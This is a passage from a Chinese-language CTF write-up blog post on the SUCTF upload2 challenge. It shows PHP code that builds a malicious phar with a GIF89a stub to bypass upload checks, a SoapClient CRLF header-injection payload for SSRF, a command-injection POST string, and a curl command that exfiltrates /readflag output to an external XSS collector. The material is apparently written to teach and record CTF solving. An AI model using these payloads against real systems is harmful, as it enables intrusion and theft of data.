class="string">"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>.join(<span class="string">"\r\n"</span>,<span class="variable">$headers</span>).<span class="string">"\r\nContent-Length: "</span>.(string)strlen(<span class="variable">$post_string</span>).<span class="string">"\r\n\r\n"</span>.<span class="variable">$post_string</span>,<span class="string">"uri"</span>      =&gt; <span class="string">"mfk"</span>));</span><br><span class="line"><span class="variable">$arr</span> = array(null, array(<span class="string">"location"</span> =&gt; <span class="variable">$target</span>,<span class="string">"user_agent"</span>=&gt;<span class="string">"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>.join(<span class="string">"\r\n"</span>,<span class="variable">$headers</span>).<span class="string">"\r\nContent-Length: "</span>.(string)strlen(<span class="variable">$post_string</span>).<span class="string">"\r\n\r\n"</span>.<span class="variable">$post_string</span>,<span class="string">"uri"</span>      =&gt; <span class="string">"mfk"</span>));</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">'test.phar'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">'test.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">"GIF89a"</span> . <span class="string">"&lt;script language='php'&gt;__HALT_COMPILER();&lt;/script&gt;"</span>);//因为不能存在&lt;?所以这里用script绕过，图片检测加gif89a绕过</span><br><span class="line"><span class="variable">$o</span> = new File(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></p>
<p>buu上这道题做了些更改在Ad类的destruct中直接注入命令<br>所以post的值要做些修改<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$post_string</span> = <span class="string">'admin=1&amp;clazz=Mysqli&amp;func1=init&amp;arg1=&amp;func2=real_connect&amp;arg2=1&amp;func3=query&amp;arg3=&amp;cmd=whoami'</span>;</span><br></pre></td></tr></table></figure></p>
<p>失败了，本地测了一下参数没问题，是实例化soapclient类去访问本地admin出错了，也不知道怎么改凉凉<br>暂且记到这里，以后会了再更<br>终于知道怎么回事了，感谢ice_cream师傅和ch4ser师傅<br><img src="https://uploader.shimo.im/f/56YhaIQICukygdGa.png!thumbnail" alt><br>执行命令无回显，但是可以用curl 把flag带出去，因为buu不能访问外网，所以这里使用buu的xss平台<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd= curl --referer <span class="string">"`/readflag`"</span> --insecure \<span class="string">'http://xss.buuoj.cn/index.php?do=api%26id=94Ah9Z\'</span></span><br></pre></td></tr></table></figure></p>
<p>这里有一个坑就是xss外链有个&amp;,要url编码，还有就是flag位置，试了好久，才找到/readflag<br><img src="https://uploader.shimo.im/f/SJCUMCVnahc2hTlZ.png!thumbnail" alt></p>
</div><div class="post-copyright"><blockquote><p>Ursprünglicher Autor: cop</p><p>Ursprünglicher Link: <a href="http://yoursite.com/2020/01/11/SUCTF刷题记录/">http://yoursite.com/2020/01/11/SUCTF刷题记录/</a></p><p>Copyright-Erklärung: Bitte geben Sie die Quelle des Nachdrucks an.</p></blockquote></div><div class="tags"></div><div class="post-share"><div class="social-share"><span>Aktie:</span></div></div><div class="post-nav"><a href="/2020/01/12/swpu刷题记录/" class="pre">swpu刷题记录</a><a href="/2019/12/24/记一些自己的憨批做题经历/" class="next">记一些自己的憨批做题经历</a></div><div id="comments"></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">Inhalte</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyWeb"><span class="toc-text">EasyWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload2"><span class="toc-text">upload2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phar反序列化"><span class="toc-text">phar反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化配合soapclient类进行ssrf"><span class="toc-text">反序列化配合soapclient类进行ssrf</span></a></li></ol></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/05/24/GKCTF/">GkCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/20/2020网鼎后三场wp/">2020网鼎后三场wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/11/2020网鼎杯wp/">2020网鼎杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/09/。。。/">。。。</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/05/2020de1ctf/">2020de1ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/29/node题目/">node题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/2020hfctf/">2020hfctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/14/buu按顺序刷题知识点小结/">buu按顺序刷题知识点小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/01/suctf2018刷题记录/">suctf2018刷题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/29/初识pickle反序列化/">初识pickle反序列化</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> Archiv</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">29</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> Blogroll</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">Sitemap</a> |  <a href="/atom.xml">Abonnieren Sie diese Site</a> |  <a href="/about/">Kontaktieren Sie den Blogger</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">cop.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.5"></script><div id="fullscreen-img" class="hide"><span class="close"></span></div><script type="text/javascript" src="/js/imgview.js?v=2.0.5" async></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.5" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body></html>